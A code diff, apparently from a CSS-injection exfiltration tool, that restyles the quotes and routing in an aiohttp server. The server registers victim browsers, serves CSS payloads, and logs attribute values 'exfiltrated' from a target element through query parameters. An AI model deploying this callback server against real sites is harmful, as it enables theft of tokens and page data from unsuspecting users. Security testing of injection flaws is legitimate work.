@@ -27,7 +27,7 @@ class Server:
             port=self.port,
             element=self.element,
             attribut=self.attribut,
-            timeout=getattr(args, "timeout", 3.0),
+            timeout=getattr(args, 'timeout', 3.0),
         )
 
     async def start(self):
@@ -50,24 +50,24 @@ class Server:
         client = self.clients.register(
             Client(
                 host=request.remote,
-                accept=request.get("accept"),
+                accept=request.get('accept'),
                 headers=dict(request.headers),
                 event=asyncio.Event(),
             ),
         )
         if self.output_file:
             self.output_file.update()
-        Console.log(LogLevel.CONNECTION, f"Connection from {client.host}")
-        Console.log(LogLevel.CONNECTION_DETAILS, f"ID : {client.id}")
+        Console.log(LogLevel.CONNECTION, f'Connection from {client.host}')
+        Console.log(LogLevel.CONNECTION_DETAILS, f'ID : {client.id}')
         client.event.set()
 
         if self.show_details:
             for key, value in request.headers.items():
-                Console.log(LogLevel.CONNECTION_DETAILS, f"{key} : {value}")
+                Console.log(LogLevel.CONNECTION_DETAILS, f'{key} : {value}')
 
         return web.Response(
             text=self.strategy.generate_start_payload(client),
-            content_type="text/css",
+            content_type='text/css',
         )
 
     async def handle_end(self, request):
@@ -83,14 +83,14 @@ class Server:
 
         Console.log(
             LogLevel.END_EXFILTRATION,
-            f"[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}",
+            f'[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}',
         )
 
-        client.data = ""
+        client.data = ''
 
         return web.Response(
             text=self.strategy.handle_end(client),
-            content_type="text/css",
+            content_type='text/css',
         )
 
     async def handle_next(self, request):
@@ -104,12 +104,12 @@ class Server:
 
         return web.Response(
             text=self.strategy.generate_next_payload(client),
-            content_type="text/css",
+            content_type='text/css',
         )
 
     async def handle_valid(self, request):
         client = self._get_client(request)
-        data = request.query.get("t")
+        data = request.query.get('t')
 
         client.event.set()
 
@@ -121,24 +121,24 @@ class Server:
         if self.show_details:
             Console.log(
                 LogLevel.EXFILTRATION,
-                f"[{client.id}] - Exfiltrating element: {data}",
+                f'[{client.id}] - Exfiltrating element: {data}',
             )
 
-        return web.Response(text="ok", content_type="text/css")
+        return web.Response(text='ok', content_type='text/css')
 
     async def dynamic_router_middleware(self, app, handler):
         async def middleware_handler(request):
             path = request.path
 
-            if path.startswith("/start"):
+            if path.startswith('/start'):
                 return await self.handle_start(request)
-            elif path.startswith("/n"):
+            if path.startswith('/n'):
                 return await self.handle_next(request)
-            elif path.startswith("/v"):
+            if path.startswith('/v'):
                 return await self.handle_valid(request)
-            elif path.startswith("/e"):
+            if path.startswith('/e'):
                 return await self.handle_end(request)
-            return web.Response(text="404: Not Found", status=404)
+            return web.Response(text='404: Not Found', status=404)
 
         return middleware_handler
 
@@ -148,11 +148,11 @@ class Server:
             response = await handler(request)
             return response
         except Exception as ex:
-            Console.error_handler(ex, context={"source": "middleware"})
-            return web.Response(text="500: Internal Server Error", status=500)
+            Console.error_handler(ex, context={'source': 'middleware'})
+            return web.Response(text='500: Internal Server Error', status=500)
 
     def _get_client(self, request) -> Client:
-        client = self.clients.get_by_id(request.query.get("cid"))
+        client = self.clients.get_by_id(request.query.get('cid'))
         if client is None:
-            raise InjectionError("Unknown client id")
+            raise InjectionError('Unknown client id')
         return client
